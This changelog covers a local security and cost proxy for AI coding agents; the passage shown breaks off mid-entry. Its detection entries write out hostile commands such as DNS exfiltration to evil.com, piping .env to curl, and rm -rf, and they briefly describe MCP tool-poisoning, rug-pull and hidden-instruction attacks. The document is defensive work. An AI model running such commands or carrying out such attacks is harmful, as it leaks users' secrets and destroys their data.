# Changelog

All notable changes to Burnwall.

## [0.10.0] — 2026-06-12

A large release: a wave of security, cost, and compliance features, plus an
availability-hardening pass driven by dogfooding — so the proxy stays safe to run
hands-off even when something outside Burnwall (an antivirus, a crash) takes it down.

### Added

**Security**
- **Scan agent config files for committed secrets + hidden instructions.** `burnwall
  scan <paths>` checks `CLAUDE.md` / `.cursorrules` / `.mcp.json` / `.claude/` and
  friends for committed credentials and invisible-Unicode instruction smuggling, with
  SARIF output. A one-line **GitHub Action** runs it in CI and posts findings to the
  repository's Security tab.
- **Teach your agent about Burnwall.** `burnwall skills install` drops a guide where
  Claude Code and Codex discover it, so the agent can read your spend, explain a block,
  and run the file scanner — but never weaken protection itself.
- **Decode-then-scan + invisible-text scrubbing.** Obfuscated (base64/hex) and
  zero-width-Unicode payloads inside tool calls are un-hidden before checking.
- **Canary trap.** Plant a fake credential; if it ever tries to leave the machine, the
  request is blocked and a tamper-proof receipt is sealed.
- **Egress checks for file uploads and credential misdirection** (opt-in), a
  **silent-billing watchdog** (warns when a session flips from subscription to metered),
  and a **slow-drip exfiltration monitor** (warn-only).
- **Per-project MCP allowlist** — restrict which MCP servers an agent may reach, per repo.
- **Paranoid mode** (opt-in) — fail closed: block a request the scanner cannot inspect,
  for users who prefer that over the fail-open default.
- **Image/link exfil warning** (opt-in, warn-only) — flags a model reply that embeds a
  data-carrying image URL, the zero-click exfiltration pattern.

**Cost**
- **Per-repo / per-client cost export** to CSV, correct even when several projects run
  at once.
- **`burnwall wire-check`** — compare your real on-the-wire spend with a log-scrape
  estimate.
- **Cache-dead-zone warning**, an **hourly spend brake** (opt-in), and an optional
  **cheaper-model fallback** when you hit a budget cap instead of stopping work.
- **Tool-output trim** (opt-in) — middle-truncate oversized tool results before they
  re-enter context, with an in-band marker, to cut token cost.

**Compliance**
- **SPDX 3.0 AI-profile bill-of-materials** and framework-labelled evidence packs on top
  of the existing CycloneDX AIBOM + SARIF exporters; a control crosswalk rides on blocks.

**Integration**
- **Sit in front of a gateway you already use.** A new `[upstreams]` config (and
  `--upstream-*` flags) chains Burnwall ahead of any OpenAI- or Anthropic-compatible
  gateway, keeping cross-tool spend tracking and enforcement on top.

**Resilience**
- **`burnwall recover`** — get unstuck if the proxy dies under you: pauses routing so new
  shells go direct, and explains how to restore already-open tools.
- **`burnwall guard`** — a watchdog that auto-pauses routing if the proxy dies while
  routed, so a crash or quarantine can't strand new shells.

**Diagnostics & data**
- **`burnwall doctor`** — a one-glance health check that names what's wrong and the exact
  fix, with `burnwall doctor --export` writing a redacted, metadata-only bundle that
  self-scans for secrets before it's written (and refuses to write if anything
  secret-shaped survives) — the thing to attach to a bug report.
- **`burnwall explain <id>`** — explain any block in plain language: what rule fired, a
  masked preview of what matched, why that class is blocked, and how to proceed.
- **`burnwall export --format csv|json`** — a portable copy of your metadata, on your
  machine, any time.
- **Rule reference + troubleshooting docs.** Every block carries a stable rule id that
  resolves to a `docs/RULES.md` entry (mirrored by `burnwall explain`), plus a
  symptom→fix `docs/TROUBLESHOOTING.md` and a diagnostic-first bug-report template.

### Changed
- **Graceful drain on stop.** `burnwall stop` (and `upgrade`) now let in-flight requests
  finish before exiting instead of cutting them mid-stream.
- **A crash, forced kill, or antivirus quarantine is now diagnosed.** `burnwall start`
  notices an unclean prior exit and, on a streak, points at the likely cause (an
  antivirus quarantining the unsigned binary) with the fix. Panics in background tasks
  are now written to the log instead of vanishing silently.
- **Status-line block count** reads `🚫 N blocked` and no longer renders the digit on top
  of the shield glyph in some terminals.
- **Status-line context reads true.** The context gauge no longer snaps toward ~100% off
  a stale plan window — it shows the tool's own headroom figure (the one `/usage` reports)
  and marks it stale rather than implying the conversation is nearly full.
- **Blocks and alerts are reported separately.** A warn-only security alert is no longer
  counted as a block: `burnwall status` shows the two side by side, and the nudge line
  reads "blocked N request(s)" versus "raised N security alert(s)" honestly.
- **Windows install note.** The README and the installer now explain the
  Defender/SmartScreen false positive and how to recover from it.

### Fixed
- **Fewer false security blocks**, each locked with a regression test: a
  credential-shaped string in resent conversation history (including a `/compact`
  summary), an editor tool writing a key into a local test fixture, a search query that
  mentions a sensitive path, and a tool's non-command metadata field no longer 403 —
  while a genuine credential or dangerous command inside an actual tool call still blocks.
- **MCP watcher description-drift state is now per-watcher.** The advisory "a tool changed
  its description" memory was process-global, so two watchers — or an ephemeral upstream
  port reused by a different server — could leak sightings into each other (a flaky test
  surfaced it). It's now scoped to each watcher instance; enforcement was never affected.

## [0.9.15] — 2026-06-10

A follow-up from live dogfooding: kill a false-positive class that could wedge a
whole session, make every block explain itself, give false positives a live
escape hatch, and stop surfaces from showing stale numbers when the proxy is
down.

### Added
- **`burnwall pause` / `resume` / `allow-once` — a live escape hatch.** After a
  block you believe is a false positive, `burnwall allow-once` lets exactly the
  next request through (then protection restores itself), and `burnwall pause
  [5m]` relays everything unchecked for a bounded window — both take effect on
  the running proxy with no daemon or AI-tool restart, so the agent's session
  survives. Pauses auto-expire (default 5 minutes, capped at 24 hours), an
  unused allow-once expires after 10 minutes, and every status surface shows a
  loud `⏸ PAUSED` warning with a countdown for the whole window. Block messages
  now point at these toggles; the previous advice (an environment variable plus
  a tool restart) never reached a backgrounded daemon and has been removed.

### Fixed
- **A secret-shaped token in conversation history no longer blocks the session.**
  Security data checks (credentials, cards, SSNs) now run only inside tool-call
  arguments — the agent *action* — never on prose or resent conversation history.
  Clients resend the full conversation every turn, so a key-shaped string merely
  *quoted or discussed* (e.g. an example key in a summary) used to 403 every
  request until the session was abandoned. The exfiltration vector that matters —
  a credential leaving the machine inside a tool call — stays fully covered.
- **Subscribers no longer see a notional dollar figure where a plan reading
  belongs.** When the latest plan reading is stale (idle, or the proxy was briefly
  down), the status line keeps showing last-known plan headroom — marked stale —
  instead of falling back to a session-cost figure that reads as real money. The
  `status` command frames a subscriber's spend as notional, not a budget breach.

### Changed
- **Blocks now explain themselves.** A security block names the tool that tripped
  it, shows a masked, recognisable preview of what matched (e.g. `AKIA…LKEY`) for
  credential/PII hits — the raw value is never echoed or logged — and states why
  that class is blocked, instead of a bare category label.
- **A down proxy now looks down.** When routing points at a dead proxy, status
  surfaces drop the cost, plan, today, and block-count segments (all stale with no
  capture happening) and show only the loud "proxy down" warning alongside the
  tool-reported token and context gauges.

## [0.9.14] — 2026-06-10

A real-world robustness pass driven by dogfooding: a multi-agent review of
every feature, focused on the failure modes that make a tool freeze, falsely
block, or mislead — the kind that trigger an uninstall.

### Fixed

- **The daily budget now resets at midnight.** A long-running proxy used to
  accumulate spend across days and eventually return "budget exceeded" on every
  request even though the day's real spend was small. The counter is now
  day- and month-aware (restart- and clock-change-proof), and the monthly cap
  is actually enforced.
- **Loop detection no longer gets stuck on retries.** A blocked request (and a
  client's automatic retry of it, or a retry after a provider outage) no longer
  feeds the loop-detection window, so a transient blip can't wedge a session
  into a permanent 429 loop. Blocks now carry a `Retry-After`, and the window is
  keyed per method/provider/path so unrelated requests don't collide.
- **Fewer false security blocks.** Writing or discussing a file that merely
  mentions a sensitive path (e.g. `~/.ssh` in a README) no longer 403s — only
  shell-tool arguments get command checks. Windows paths in tool arguments are
  no longer mistaken for network mounts, scoped deletes like `rm -rf /tmp/x`
  pass, and well-known documentation/example keys are exempt. Blocks now explain
  what was caught and how to proceed, and `burnwall report-bug` writes a
  sanitized local report for false positives.
- **The proxy no longer hangs on a stalled or unreachable upstream**, and
  cancelling a request (Esc) stops the upstream instead of billing the full
  response.
- **Accurate cost capture for more tools.** OpenAI's Responses API (used by
  Codex) is now parsed instead of silently recording $0, unknown models warn
  instead of recording $0, and the cross-tool "today" total no longer
  double-counts traffic that went through the proxy.

### Changed

- **A crashed or stopped proxy no longer breaks your terminals.** Shell routing
  is liveness-gated: if the proxy isn't running, a new shell talks directly to
  the provider (unprotected but working) instead of failing to connect. Every
  status surface shows a clear "proxy down" warning when routing points at a
  dead port. PowerShell now gets persistent routing like the other shells.
- Plan-aware budgeting: on a flat-rate subscription, the dollar cap is treated
  as advisory (tracked and warned, not blocked) unless you opt in.
- Hardening across MCP (prose-safe scanning, clearer approval errors), the audit
  chain (lost-key detection), storage (schema versioning), and the daemon
  (a real log file, PID identity checks).

## [0.9.13] — 2026-06-09

### Fixed

- **Talking *about* a denied path or command no longer blocks the request.**
  The proxy's security scan previously applied every rule to every string in
  the request body, so a system prompt, chat message, tool definition, or tool
  result that merely *mentioned* `~/.ssh` or `rm -rf` returned a 403 — e.g. a
  project's CLAUDE.md documenting a deny list made every Claude Code request
  from that repo fail (surfacing in the client as a bogus "run /login" auth
  error). Command-shaped rules (denied paths/commands, network mounts,
  destructive commands, exfil techniques) now apply only inside tool-call
  argument subtrees (Anthropic `tool_use.input`, OpenAI
  `tool_calls`/`function_call` arguments, Gemini `functionCall`) — the places
  an agent actually acts. Secret detection and DLP still scan the entire
  payload, and MCP `tools/call` bodies keep the strict whole-body scan.
- **A blocked tool call no longer poisons the conversation forever.** Clients
  resend the full history on every request, so one (correctly) blocked call
  used to re-trigger the 403 on every subsequent message — the only escapes
  were a new conversation or the bypass switch. Command-shaped rules now apply
  to the **latest assistant turn's in-flight tool round** only: the request
  carrying the dangerous call (and its results) is still blocked, but once the
  user sends a new message that round is adjudicated history and the
  conversation continues. Secrets/DLP still scan all turns, so sensitive
  content in old results stays caught.
- **`burnwall stop` no longer strands routed shells on a dead proxy.** Stopping
  the proxy used to leave `ANTHROPIC_BASE_URL`/`OPENAI_BASE_URL` pointing at
  the closed port, so every AI tool failed with a connection error until the
  user discovered `disable-routing`. `stop` now pauses routing (new shells go
  direct), prints how to clear the variables from already-open terminals, and
  `start` resumes routing automatically. An explicit `burnwall
  disable-routing` is remembered and never overridden by `start`; opt out of
  the coupling with `stop --keep-routing` / `start --no-routing`.

### Added

- **`uninstall` now removes routing env files instead of stubbing them, and
  warns about already-open terminals.** The leftover banner-only stub was
  residue on a machine the user asked to clean, and it kept counting the
  shell as "configured" forever (fish/PowerShell are detected by env-file
  presence). Uninstall also can't pull env vars out of running shells — no
  uninstaller can — so it now says so and prints the per-shell unset command.

- **Pricing for Claude Fable 5 and Opus 4.8** (both released 2026-06-09):
  `claude-fable-5` at $10/$50 per MTok (cache write $12.50, read $1.00) and
  `claude-opus-4-8` at the standard Opus $5/$25. Pricing lookup now also
  resolves bracket variant tags — Claude Code requests the 1M-context tier as
  `claude-fable-5[1m]`, which previously fell through to "unknown model".

## [0.9.12] — 2026-06-09

### Fixed

- **Routing commands now act on every configured shell, not just the detected
  one.** A user often drives more than one shell (on Windows, PowerShell *and*
  Git-bash are the norm). Previously `enable-routing` / `disable-routing` /
  `uninstall` resolved a single shell and touched only its env file + rc hook, so
  enabling from PowerShell left bash silently unrouted (and `uninstall` could
  leave a live rc hook pointing at a removed proxy). They now sync the detected
  shell **plus** every shell already configured for routing, keeping them
  consistent. Bash/zsh are disambiguated by their rc-hook (they share one
  `env.sh`); fish/PowerShell by their own env files — so a never-used shell is
  never pulled in (no spurious `~/.zshrc`).

### Added

- **Not-routed warning on the Claude Code status line.** When a tool's traffic
  isn't flowing through the proxy, the ribbon shows a loud `⚠ DIRECT
  (unprotected)` chip (and `⚠ bypass` when `BURNWALL_BYPASS` is set) right after
  the model — so "the proxy is running but my traffic isn't reaching it" can't go
  unnoticed. Detected from the tool's `*_BASE_URL` in the environment the status
  line inherits; silent on the healthy path.
- **Routing readout in `burnwall status`.** A per-shell line states whether this
  shell points traffic at the proxy, with the one-line fix when it doesn't; also
  surfaced as `env_routing` in `status --json` for the editor extension.
- **Colorized console output.** The install scripts (`install.sh` / `install.ps1`),
  the proxy banner, the background-start and login-service messages, and the
  routing/coverage readouts now use semantic color (green = active/healthy,
  yellow = caution, red = unprotected). Honors `NO_COLOR` and non-TTY output, so
  piped/redirected text stays clean.

## [0.9.11] — 2026-06-08

### Added

- **Subscription-aware status, across every surface.** For a Claude Pro/Max plan,
  dollar figures are notional (you pay a flat rate), so Burnwall now shows what's
  actually scarce: your usage-window headroom. The proxy reads Anthropic's
  `anthropic-ratelimit-unified-*` response headers (rolling 5-hour + 7-day windows)
  off traffic it already forwards and persists a small, non-sensitive, **per-provider**
  snapshot; surfaces render e.g. `5h [▓░░░░░░░] 17% (1h56m) · 7d 10%` in place of the
  dollar segment, leading with whichever window the provider reports as binding and
  flagging a throttled status. Auto-detected (a subscription emits these headers, an
  API key doesn't — verified against Anthropic's docs), so API users keep the
  dollar/cost view with no configuration; falls back to dollars when no fresh snapshot
  exists. Surfaced on:
  - the **Claude Code status line** (`burnwall statusline`);
  - **`burnwall watch`** — the cross-tool pane for CLIs without their own status bar
    (Codex, Aider, …): run it in a split pane to see the gauge;
  - **`burnwall watch --title`** — emits the ribbon as a terminal-title (OSC) escape,
    for a shell prompt hook or `tmux status-right`, so even a status-bar-less CLI gets
    it in the window title;
  - **`status --json`** — a `plan` block (per-provider windows + reset countdown),
    rendered by the **VS Code / Cursor / Windsurf extension** status bar + tooltip.

  The capture is provider-generic; OpenAI/Google hooks exist but return nothing until
  their subscription signal is probed and verified (we don't synthesize a window from
  per-minute API limits).

- **Coverage readout — which of your tools are actually behind the firewall.** A
  proxy only protects traffic that flows through it, and the dangerous failure mode
  is *silent* non-coverage — a tool you assume is protected whose traffic never
  reaches Burnwall. Burnwall now makes coverage visible per installed tool:
  - **`burnwall init`** warns at setup when a detected tool is in a bypassing mode —
    concretely, Codex signed in with ChatGPT login (read from `~/.codex/auth.json`,
    a local non-secret mode flag), whose traffic goes to the ChatGPT backend over
    OAuth and can't be routed through any no-MITM proxy. It notes that API-key
    mode would route through Burnwall but bills per-token — an informed trade-off,
    not a blanket "switch."
  - **`burnwall status`** and **`burnwall watch`** show a per-tool **Coverage**
    section: *protected* (provider seen routing recently), *installed but no traffic
    seen*, or *bypasses*. `status --json` carries a `coverage` array, and the VS Code
    / Cursor / Windsurf extension surfaces a `⚠ <tool> unprotected` warning plus a
    tooltip breakdown.
  - README documents the boundary outright.

- **More official security rule packs.** The bundled, signed-release rule packs
  grew from 4 to **8** — added `node`, `python`, `go`, and `kubernetes`, and
  fleshed out `django` / `react` / `infrastructure` / `data-science` (now ~61
  rules total). Each targets unambiguously sensitive credential/state files
  (`.npmrc`, `.pypirc`, kubeconfigs, `terraform.tfstate`, …) and genuinely
  destructive commands, keeping the low-false-positive bar. Install with
  `burnwall rules install <id>`; list with `burnwall rules list`.
- **`burnwall rules lint`** — validate a rule pack against strict acceptance rules
  (stricter than the runtime: forbidden/unknown keys, uncompilable or over-broad
  rules are hard errors), optionally verifying its signature (`--sig`). Exits
  non-zero on any error and supports `--json`, so it can gate a community rule
  repo's CI. The bundled official packs are themselves checked by it in CI.

### Changed

- Status ribbon now carries a `burnwall` wordmark — `🔥 burnwall · <model> · …` —
  across every surface (Claude Code status line, `burnwall watch`, editor status
  bar), which share one renderer.
- `short_model` now keeps a trailing context-variant tag and upper-cases it, and
  no longer lets it defeat the version dotting: `claude-opus-4-8[1m]` renders as
  `opus-4.8[1M]` (was `opus-4-8[1m]`).

## [0.9.10] — 2026-06-08

### Added

- **`burnwall init` now wires up the Claude Code status line.** When Claude Code
  is detected, `init --apply` merges a `statusLine` block into
  `~/.claude/settings.json` so the Burnwall ribbon (model · ↑/↓ tokens · spend)
  appears automatically — no hand-editing JSON. The merge is idempotent,
  preserves your other settings, writes the PATH-resolved `burnwall statusline`
  command, and never overwrites a status line you already configured.
- **`burnwall uninstall`** — one command to undo everything `install` + `init`
  set up: stops the proxy, removes the login service, removes the Claude Code
  status line (a foreign one is left untouched), empties the routing env file and
  removes the rc-source hook, and removes the binary. Your cost-history database
  is kept by default; `--purge` deletes the whole `~/.burnwall` data directory.
  Confirms before acting (skip with `--yes`); refuses to run non-interactively
  without `--yes`.

### Changed

- `burnwall upgrade` now sweeps the leftover `burnwall.exe.old` from a previous
  Windows self-upgrade on the next launch, so the transient renamed binary never
  lingers (best-effort, silent; the running binary can't delete itself).

## [0.9.9] — 2026-06-08

### Added

- **`burnwall upgrade`** (alias `self-upgrade`) — one command to move to the
  latest release. It stops the running proxy first (a live `burnwall.exe` can't
  be overwritten on Windows), runs the installer, and restarts the proxy. On
  Windows it renames its own running binary aside so the installer can write the
  new one, restoring it if the install fails. `--dry-run` to preview,
  `--no-restart` to skip the restart. The mirror of `self-rollback`.

## [0.9.8] — 2026-06-07

### Added

- **`burnwall savings`** — your own *measured* cache-savings report: dollars
  recovered through caching over a window (from real token buckets at published
  cache-read vs base-input rates), plus models that are underusing caching. No
  marketing percentages — your numbers.
- **`burnwall watch` / `status` self-test heartbeat** — `status` now states
  plainly whether protection is live ("proxy running (pid …); every request is
  scanned"), so a passive proxy never leaves you wondering if it's working.
- **`burnwall share`** — an opt-in, screenshot-friendly, **signed** value card
  (spend / cache savings / blocks), verifiable against the local audit key so the
  numbers can't be faked. Nothing leaves your machine.
- **`burnwall sidecar`** — run the proxy as a co-located egress point for an
  agent that executes off your laptop (self-hosted sandbox / container / CI
  runner), with the in-sandbox env-var recipe. Same scanning + budgets; not a
  TLS-terminating proxy (no CA injection — see `SECURITY.md`).
- **Catastrophic-command detection by shape** — recursive-force deletes, disk
  destruction (`dd of=/dev/…`, `mkfs`), and destructive SQL (`DROP`/`TRUNCATE`)
  are blocked regardless of flag order, spacing, or target expansion — the forms
  that slipped past literal/approval checks in real incidents.
- **Data-exfiltration technique detection** (opt-in under `security.dlp`): DNS
  exfiltration, secret-file-piped-to-network, command-substituted uploads.
- **Per-session / swarm budget ceiling** (`budget.per_session`, opt-in via an
  `x-burnwall-session` request header) — agents in a fan-out that share a session
  id share one blast-radius cap; `status` shows a per-session breakdown.
- **Build provenance** — releases now carry GitHub Artifact Attestations (SLSA
  Build L2); verify with `gh attestation verify … --repo intbot/burnwall`. New
  `SECURITY.md` documents integrity + TLS handling (rustls, no CA injection, no
  plaintext at rest), backed by a guard test.

### Changed

- `command_matches` is whitespace-normalized, so padding (`rm   -rf   /`) can't
  evade a literal deny rule.
- README: "Verify your download" + the trust/defense-in-depth sections.

## [0.9.7] — 2026-06-07

### Added

- **Data-exfiltration technique detection** (opt-in, under `security.dlp`) — the
  scanner now flags the exfiltration *method* in a tool-call argument, not just
  secrets in the payload: DNS exfiltration (`dig $(...).evil.com`, encoded
  subdomains), a secret file piped to the network (`cat .env | curl -d @-`), and
  command-substituted uploads. Conservative/high-signal (a network tool alone is
  fine) and names only the technique, never the data.
- **`burnwall security --summary`** — a "what Burnwall caught for you" receipt:
  blocks grouped by type over the window (pairs with `--days 7`), so passive
  protection registers as ongoing value instead of going unseen.
- **`burnwall audit pack`** — one-command compliance evidence pack: bundles the
  signed hash-chained receipts, the CycloneDX 1.6 AIBOM, and the SARIF 2.1.0
  security findings into a directory with a `MANIFEST.md` that maps each artifact
  to the controls auditors ask for (ISO/IEC 42001, EU AI Act Art. 12/26, FINRA).
  The artifacts already existed; this is one command + the framework mapping you
  can hand a security team.
- **MCP firewall is validated against the published attacks** — a test corpus
  models the real PoCs (Invariant tool-poisoning / SSH-key exfiltration, the
  MCPoison rug-pull that swaps a tool's behavior after approval, `<IMPORTANT>`
  shadowing) so coverage is provable and stays covered.

### Changed

- README: a **Trust & privacy** section (local, zero-telemetry, read-only on
  responses, signed single-binary releases, auditable "no network except
  forwarding"), a **defense-in-depth** framing for security (rules run before
  anything leaves your machine; complements — doesn't replace — native
  controls), and the MCP scope note now points at the built-in `mcp-watch`
  firewall (tool-poisoning + rug-pull detection).

## [0.9.6] — 2026-06-07

### Added

- **`burnwall watch`** — a live, cross-tool status ribbon for a spare terminal
  pane. The in-TUI ribbon only works in Claude Code; this shows the *same*
  renderer for every tool that routes through the proxy (Codex, Gemini, Aider,
  …), sourced from the local database. `--oneline` for a compact line, `--once`
  for a single frame (scripting/tests), `--interval` for the fallback refresh.
  It refreshes event-driven off the `watch.signal` marker the proxy touches each
  turn, with a periodic fallback. The headline figure is **today's spend across
  all tools** — the cross-tool number no single tool shows.
- The status ribbon's context gauge stays honest on this surface: no tool feeds
  an exact context %, so it's an estimate (`~`) when the model's window is known
  and the prompt fits, and `—` otherwise — never an unqualified number.

### Changed

- Ribbon cost fields (`sess`, `today`) are now rendered only when known, so the
  cross-tool view (which has no per-session concept) shows per-message + today
  without a misleading "session" figure.

## [0.9.5] — 2026-06-07

### Added

- **`burnwall statusline`** — renders the Burnwall ribbon for Claude Code's
  customizable status line. Reads Claude Code's per-turn JSON on stdin and prints
  one line: `🔥 sonnet-4.6 · ↑13k ↓615 · $0.05 msg $0.16 sess · $2.40 today · ctx
  [▓▓░░░░░░] 22%`. Per-message cost is derived from the cumulative session total;
  today's spend and security-block count are enriched from the proxy database, so
  the line reflects spend **across all your tools**, not just the current one.
  Wire it up with one line in `~/.claude/settings.json`:
  `{ "statusLine": { "type": "command", "command": "burnwall statusline" } }`.
  Fail-open: malformed input or an unreadable database still yields a best-effort
  line rather than breaking the editor.
- **Context gauge is honest by construction** — the ribbon shows a context-window
  percentage only when it's *exact* (reported by the tool, e.g. Claude Code).
  Where a value is estimated it's flagged with `~`; where the window can't be
  trusted it renders `—`; where the tool already shows its own gauge it's omitted
  rather than duplicated.
- **Activity marker** — the proxy touches `<data dir>/watch.signal` after each
  recorded turn (off the response path, so no added latency), laying the
  groundwork for event-driven refresh of upcoming status surfaces.

### Fixed

- **`burnwall install-service` on Windows no longer needs admin.** It previously
  created a Scheduled Task at the Task Scheduler library root, which requires
  elevation and failed with "Access is denied" for a normal shell. The default is
  now a per-user `HKCU\…\Run` registry entry that launches `burnwall start
  --daemon` at logon — no UAC. `--task` opts back into the Scheduled-Task variant
  (which adds crash-restart) for users who run an elevated terminal.
  `uninstall-service` removes whichever was installed.

## [0.9.4] — 2026-06-07

### Added

- **Five-layer graceful-degradation model**, so a bad release can't break your AI
  tools:
  - `BURNWALL_BYPASS=1` — instant kill-switch. Proxy becomes a pure relay; no
    security scan, no budget check, no storage write. Forward bytes to the
    upstream and stream the response back unchanged.
  - **Panic-catching wrapper** — if anything in the request pipeline panics, the
    proxy returns a clear 502 (pointing the user at `BURNWALL_BYPASS=1`) instead
    of dropping the connection.
  - **Crash-loop circuit breakers** baked into each platform's service unit
    (launchd `ThrottleInterval=60`, systemd `StartLimitBurst=5`, Task Scheduler
    `RestartOnFailure` capped at 5 attempts).
  - **`burnwall self-rollback <version>`** — fetches the version-pinned dist
    installer for any prior release and reinstalls. Windows refuses to roll back
    while the proxy is running so it can replace the binary safely.
  - **Sourced env-file activation model** — one burnwall-owned file
    (`~/.config/burnwall/env.sh` / `%APPDATA%\burnwall\env.ps1`) holds the
    routing exports; the user's rc gets one idempotent source line. Disable by
    truncating the env file — one place to revert.
- **`burnwall enable-routing` / `disable-routing`** — write/clear the env file,
  install the rc-hook, and emit eval-able exports for immediate-effect
  activation in the current shell (`eval "$(burnwall enable-routing)"` on POSIX,
  `burnwall enable-routing --eval | Out-String | Invoke-Expression` on
  PowerShell). `enable-routing` runs a `/healthz` preflight against the proxy
  before activating.
- **`burnwall install-service` / `uninstall-service`** — registers burnwall as a
  login-time service so the proxy auto-starts. User-scoped (no admin needed) on
  all three platforms: launchd LaunchAgent on macOS, systemd user unit on Linux,
  Windows Scheduled Task at logon.
- **`/healthz`** local probe — returns 200 without touching upstreams. Used by
  the activation preflight, the supervisor circuit breaker, and any external
  monitor.
- **Extended `burnwall init`** — two-step interactive flow that now also offers
  login-service install and routing activation in the same run. `--apply` to
  execute, `--yes` for unattended scripted use, `--install-service` to opt in to
  the supervisor.
- **Local pricing overrides** — drop a `~/.burnwall/pricing.toml` to override or
  add model rates without waiting for a release. Entries take precedence over the
  built-in rate card and handle date-suffixed model IDs automatically, so a
  brand-new model can be priced immediately and a mid-cycle price change is a
  two-line edit. This is the escape hatch the staleness warning always
  advertised — now actually wired up.
- **`burnwall pricing` command** — `list` shows the effective rate card (built-in
  plus overrides, with the source of each), `path [--init]` prints/scaffolds the
  override file.
- **Signed remote pricing cards** — `burnwall pricing update` fetches a
  `pricing.toml` from a URL (default: the latest GitHub release asset) and
  installs it **only** if its detached Ed25519 signature verifies against a
  trusted `[pricing].publishers` key — verify-before-parse, no fail-open.
  `pricing sign` / `pricing verify` cover the publisher and offline-check sides,
  reusing the same key format as `burnwall rules keygen`. Lets prices ship
  between binary releases without giving up zero-trust.

### Changed

- **`burnwall init` output reworked** — dry-run output now lists the two actions
  (routing + service) with the exact file paths and exports that would be
  written. The legacy `append_to_rc` helper is kept (still used by tests) but
  routing activation now goes through the new sourced env-file path.
- **`burnwall status`** — the stale-pricing warning now points at
  `burnwall pricing path --init`, and an active-override count is shown (plus a
  `pricing_override_count` field in `status --json`).

## [0.9.3] — 2026-05-29

### Fixed

- **Path/command security rules are now case- and separator-insensitive**, so an
  access to `~/.SSH/id_rsa` — or a mixed `\`/`/` Windows path — can no longer slip
  past a `~/.ssh` deny rule on case-insensitive filesystems (Windows, default macOS).
- **`start --daemon`** now forwards the `--upstream-google` and
  `--rewrite-anthropic-cache` flags to the background process instead of dropping them.

### Added

- **Opt-in cost-spiral enforcement** — set `[loop_detection].cost_spiral_enforce = true`
  to block the next request once rolling spend exceeds `max_cost_per_window`. Off by
  default; detection still logs a warning regardless.
- **Optional build features** (`audit`, `mcp`, `observe`, `logscrape`, `waste`), all on
  by default so the shipped binary is unchanged. `cargo build --no-default-features`
  now produces a lean core-proxy build (cost + security + budget + storage).

### Changed

- **Migrated to the Rust 2024 edition** with a declared minimum supported Rust version,
  and moved lint policy into `Cargo.toml`.
- **SQLite hardening** — WAL journal mode and a busy-timeout, plus response-path writes
  now run off the async runtime so the proxy never stalls on disk I/O.

## [0.9.2] — 2026-05-28

### Added

- **"Use Burnwall with anything" cookbook** (`docs/INTEGRATIONS.md`) — one-line
  base-URL recipes to put Burnwall in front of your coding tools, agent SDKs, and
  any OpenAI-/Anthropic-compatible gateway (e.g. OpenRouter). Burnwall runs *in
  front of* your existing setup; nothing else changes.
- **Independent audit verification.** `burnwall audit export --format json` emits a
  self-contained, signed receipt bundle, and `tools/verify_receipts.py` re-walks the
  hash chain and verifies every Ed25519 signature **without trusting the Burnwall
  binary**. `docs/COMPLIANCE.md` maps the receipts to EU AI Act Art. 12 / ISO 42001
  A.6.2.8 / SOC 2 / NIST AI RMF (as *evidence*, not certification).
- **MCP registry manifest** (`packaging/mcp/server.json`) + `docs/MCP_REGISTRY.md`
  so the local MCP firewall can be listed/discovered.
- **OpenSSF Scorecard CI** (supply-chain trust signal) and a clearer
  "100% local, zero telemetry" README headline.

## [0.9.1] — 2026-05-28

### Added

- **`burnwall cost-per-pr [--base main] [--json]`** — approximate cost of the
  current git branch / PR, by attributing local cross-tool session-log spend to the
  branch's active window (oldest commit on `base..HEAD`). Local + git metadata only;
  never reads prompt content. Approximate (time-bucketed) and labelled as such.
- **MCP permission auto-policy** — `[mcp].auto_approve` and `[mcp].auto_deny` glob
  lists (matched against `"<server>/<tool>"`). Auto-deny always blocks; auto-approve
  skips the approval gate in enforce mode — cutting approval fatigue. Both opt-in.
- **VS Code inline panel** — the status-bar item now opens a panel
  (`Burnwall: Open Panel`) summarising cost-by-model, security blocks, and MCP tools
  from the local CLI JSON.
- **Soft budget alert** — `burnwall status` shows a non-blocking heads-up once
  today's spend crosses the configured warn threshold but is still under the hard
  daily limit.

## [0.9.0] — 2026-05-28

### Added

- **VS Code extension** (`editor/vscode/`) — a status-bar item showing today's
  spend, cache hit rate, and blocked-request count, read from your local
  `burnwall status --json`. Click it for the full breakdown; when the CLI isn't
  installed it links to the install instructions. Works in Cursor, Windsurf, and
  VSCodium too. No data leaves your machine.
- **Signed remote rule packs.** `burnwall rules fetch <url>` downloads a rule
  pack and its detached Ed25519 signature and installs it **only** if the
  signature verifies against a key you trust in `[rules].publishers`. The
  publisher side is `burnwall rules keygen` (make a keypair) and
  `burnwall rules sign` (sign a pack); `burnwall rules verify` checks a local
  pack + signature. A fetched pack is parsed under the same deny-only /
  append-only rules as any other pack — it can only ever add restrictions.

## [0.8.0] — 2026-05-28

### Added

- **Cryptographic audit receipts** — `burnwall audit seal` walks the request and
  security-event logs and appends, for each action, a signed link in a hash
  chain: a SHA-256 of the source row's contents, chained into the previous
  receipt, then signed with a local Ed25519 key (generated on first use).
  `burnwall audit verify` re-walks the chain and re-derives every hash from the
  live rows, so any edit, deletion, or reordering — of a receipt *or* the
  underlying row — is detected, and the chain can't be forged without the key.
  Tamper-evident, metadata-only proof of what an agent did and was blocked from.
- **CycloneDX AI Bill of Materials** — `burnwall audit aibom [--days N]` exports
  a CycloneDX 1.6 BOM for the window: models as components, MCP servers as
  services, totals in metadata. Machine-readable, audit-grade session record.
- **SARIF export** — `burnwall audit sarif [--days N]` emits security blocks as
  SARIF 2.1.0, ready to upload to GitHub code scanning (the Security tab) with
  no custom integration.
- **`burnwall report [--days N] [--format text|json|csv]`** — a shareable
  weekly/monthly summary (spend, activity, top models, security blocks), and
  **`burnwall audit export [--format json|csv]`** to dump the receipt log.

All of the above are metadata only — they never read or store prompt content —
and read-only against the existing logs.

## [0.7.0] — 2026-05-27

### Added

- **Same-model endpoint failover + circuit breaking** (`[resilience]`, opt-in).
  When an upstream is unreachable or returns a 5xx, Burnwall reroutes the same
  request to the next configured endpoint for that provider (e.g. a Bedrock or
  Vertex base URL for a Claude/Gemini model) — the request shape is identical,
  so it is a transparent reroute, not a translation. A per-endpoint circuit
  breaker (`failure_threshold`, `cooldown_seconds`) stops hammering a dead
  endpoint and lets it recover with a half-open probe. Off by default — a single
  upstream and verbatim 5xx pass-through is unchanged until you configure it.
- **`burnwall metrics [--days N] [--json]`** — per-model latency (p50/p95),
  error rate, and throughput, computed locally from the request log. The local
  answer to hosted LLM observability. Metadata only — no prompt content. The
